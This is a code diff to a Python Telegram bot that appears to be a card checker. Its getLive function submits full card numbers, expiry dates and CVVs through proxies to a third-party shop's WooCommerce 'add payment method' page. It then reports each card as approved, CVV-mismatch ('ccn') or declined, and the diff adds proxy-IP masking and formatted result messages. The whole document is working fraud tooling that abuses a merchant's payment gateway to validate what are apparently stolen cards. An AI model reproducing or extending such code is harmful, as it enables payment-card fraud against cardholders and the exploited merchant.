@@ -1,5 +1,5 @@
 import requests as r
-import string, random
+import string, random, re
 from src.assets.functions import antispam
 from src.assets.Db import Database
 from pyrogram.types import Message
@@ -160,11 +160,35 @@ async def getLive(card, msg):
     }
 
     response = session.post('https://www.myliporidex.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data, proxies=proxy)
+    conver_proxy = re.sub(r'[^a-zA-Z0-9\s.:]+', '', str(proxy)).split(":")[2]
+    hide_ip = conver_proxy.split('.')
+    hide_ip[-3:] = ['x'] * 3
+    show_ip= '.'.join(hide_ip)
     
     if 'class="button delete">Delete</a>&nbsp;' in response.text:
-        mssg = f"""Card Live
+        mssg = f"""<b>Card Approved</b> ✅
 ━━━━━━━━━━━
-└ Card: <code>{card}:{month}:{year}:{cvv}</code>"""
+┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
+├ <b>Gateway: Payflow + Woo</b>
+└ <b>Proxy:</b> {show_ip}"""
+        await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
+        
+    elif "15004 - This transaction cannot be processed. Please enter a valid Credit Card Verification Number." in getStr(response.text, """<div class="woocommerce-MyAccount-content">
+	<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">
+			<li>""", """</li>
+	</ul>
+</div>""").strip():
+        response_code = getStr(response.text, """<div class="woocommerce-MyAccount-content">
+	<div class="woocommerce-notices-wrapper"><ul class="woocommerce-error" role="alert">
+			<li>""", """</li>
+	</ul>
+</div>""").strip()
+        mssg = f"""<b>Card Approved</b> ✅ -» <b>ccn</b>
+━━━━━━━━━━━
+┌ <b>Card:</b> <code>{card}:{month}:{year}:{cvv}</code>
+├ <b>Response:</b> {response_code}
+├ <b>Gateway: Payflow + Woo</b>
+└ <b>Proxy:</b> {show_ip}"""
         await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
 
     else:
@@ -173,11 +197,12 @@ async def getLive(card, msg):
 			<li>""", """</li>
 	</ul>
 </div>""").strip()
-        mssg = f"""Card Dead
+        mssg = f"""<b>Card Declined</b> ❌
 ━━━━━━━━━━━
-└ card: <code>{card}:{month}:{year}:{cvv}</code>
-└ Response: {response_code}
-└ Proxy: """
+┌ <b>card:</b> <code>{card}:{month}:{year}:{cvv}</code>
+├ <b>Response:</b> {response_code}
+├ <b>Gateway: Payflow + Woo</b>
+└<b>Proxy:</b> {show_ip}"""
         await msg.edit_text(mssg, parse_mode=ParseMode.HTML)
         
     session.cookies.clear()
